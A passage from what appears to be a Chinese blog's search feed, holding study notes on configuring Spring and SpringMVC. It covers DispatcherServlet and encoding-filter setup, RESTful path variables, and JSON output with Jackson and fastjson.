class="com.huzai.service.bookServiceImpl"&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name="bookMapper" ref="bookMapper"/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    声明事物配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSourceTransactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        注入数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    aop事物支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="整合spring-mvc"><a href="#整合spring-mvc" class="headerlink" title="整合spring-mvc"></a>整合spring-mvc</h2><ul><li><p>spring-mvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    注解驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    静态资源过滤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    扫描包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    试图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"internalResourceViewResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>applicationContext.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-service.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-dao.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-mvc.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    DispatcherServlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    乱码过滤--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    session--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>12<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SpringMVC学习总结</title>
      <link href="/2020/10/17/SpringMVC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/17/SpringMVC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="SprngMVC学习总结"><a href="#SprngMVC学习总结" class="headerlink" title="SprngMVC学习总结"></a>SprngMVC学习总结</h1><h2 id="HelloSpringMvc遇到的问题"><a href="#HelloSpringMvc遇到的问题" class="headerlink" title="HelloSpringMvc遇到的问题"></a>HelloSpringMvc遇到的问题</h2><ul><li>Tomcat中没有相应的jar包,需要导入!</li><li>controller在注册时的id,就是url中的参数,需要保持一致</li></ul><h2 id="使用注解进行开发"><a href="#使用注解进行开发" class="headerlink" title="使用注解进行开发"></a>使用注解进行开发</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    自动扫描包，让指定包下的注解生效--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    让SpringMVC不处理静态资源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    自动注入--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RestFull风格"><a href="#RestFull风格" class="headerlink" title="RestFull风格"></a>RestFull风格</h2><h3 id="url路径中参数的携带"><a href="#url路径中参数的携带" class="headerlink" title="url路径中参数的携带"></a>url路径中参数的携带</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/add/&#123;a&#125;/&#123;b&#125;"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(@PathVariable <span class="keyword">int</span> a,@PathVariable <span class="keyword">int</span> b, Model model)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = a+b;</span><br><span class="line">    model.addAttribute(<span class="string">"msg"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSON的使用"><a href="#JSON的使用" class="headerlink" title="JSON的使用"></a>JSON的使用</h2><h3 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h3><ul><li><p>依赖(需要将其jar包导入tomcat的依赖)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用(可以在大环境下使用@RestController)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/json"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">json</span><span class="params">()</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">    ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">    Date date = <span class="keyword">new</span> Date();</span><br><span class="line">    String str = objectMapper.writeValueAsString(date);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><ul><li><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.73<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/fastJson"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">fastJson</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        fastJson 有很多功能其实都可以用jackson扩展写</span></span><br><span class="line"><span class="comment">//        java对象转JSON字符串JSON.toJSONString</span></span><br><span class="line"><span class="comment">//        JSON字符串转JAVA对象JSON.parseObject()</span></span><br><span class="line"></span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        String json = JSON.toJSONString(date);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h2><h3 id="Web中的乱码"><a href="#Web中的乱码" class="headerlink" title="Web中的乱码"></a>Web中的乱码</h3><ul><li>在web.xml中进行配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Jackson中的乱码"><a href="#Jackson中的乱码" class="headerlink" title="Jackson中的乱码"></a>Jackson中的乱码</h3><ul><li>在springMVC的配置文件中进行配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    自动注入,JSON乱码问题配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.xml.SourceHttpMessageConverter"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"failOnEmptyBeans"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="fastjson中的乱码"><a href="#fastjson中的乱码" class="headerlink" title="fastjson中的乱码"></a>fastjson中的乱码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.StringHttpMessageConverter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"supportedMediaTypes"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>application/json;charset=UTF-8<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="springMVC中的全部配置文件"><a href="#springMVC中的全部配置文件" class="headerlink" title="springMVC中的全部配置文件"></a>springMVC中的全部配置文件</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Springmvc-servlet-xml"><a href="#Springmvc-servlet-xml" class="headerlink" title="Springmvc-servlet.xml"></a>Springmvc-servlet.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span 